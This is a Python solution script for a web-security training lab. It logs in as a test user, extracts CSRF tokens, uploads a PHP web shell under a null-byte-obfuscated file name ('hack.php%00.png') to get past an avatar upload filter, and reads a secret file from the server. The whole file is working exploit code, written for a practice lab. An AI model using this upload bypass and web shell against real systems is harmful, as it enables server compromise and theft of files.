###################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 13/10/2023
#
# Lab: Web shell upload via obfuscated file extension
#
# Steps: 1. Fetch login page
#        2. Extract csrf token and session cookie
#        3. Login as wiener
#        4. Fetch wiener profile
#        5. Upload the shell file via obfuscated file extension
#        6. Fetch the uploaded shell file to read the secret
#        7. Submit solution
#
###################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a3f0039043698f381fac10400b20013.web-security-academy.net"

try:  
    # fetch login page
    get_login = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = get_login.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", get_login.content.decode())[0]

print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": "wiener",
    "password": "peter",
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login as wiener
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
    exit(1)


print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. " + Fore.GREEN + "OK")

# get the new session
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:  
    # fetch wiener profile
    wiener = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch wiener profile through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching wiener profile.. " + Fore.GREEN + "OK")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", wiener.content.decode())[0]

# the shell file to be uploaded
shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""

# the shell file name
# you can change this to what you want
shell_file_name = "hack.php"

# set the avatar
files = {
    "avatar": (f"{shell_file_name}%00.png", shell_file, "application/x-php")
}

# set the other data to send with the avatar
data = {
    "user": "wiener",
    "csrf": csrf 
}

try:  
    # upload shell file
    requests.post(f"{url}/my-account/avatar", data, files=files, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to upload the shell file through exception")
    exit(1)

print(Fore.WHITE + "⦗5⦘ Uploading the shell file via obfuscated file extension.. " + Fore.GREEN + "OK")

try:
    # fetch the uploaded shell file
    uploaded_shell = requests.get(f"{url}/files/avatars/{shell_file_name}", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the uploaded shell file through exception")
    exit(1)

print(Fore.WHITE + "⦗6⦘ Fetching the uploaded shell file to read the secret.. " + Fore.GREEN + "OK")

# get carlos secret
secret = uploaded_shell.text

print(Fore.BLUE + "❯ Secret: " + Fore.YELLOW + secret)

# set answer
data = {
    "answer": secret
}

try:
    # submit the solution
    requests.post(f"{url}/submitSolution", data)

except:
    print(Fore.RED + "[!] Failed to submit the solution through exception")
    exit(1)

print(Fore.WHITE + "⦗7⦘ Submitting the solution.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


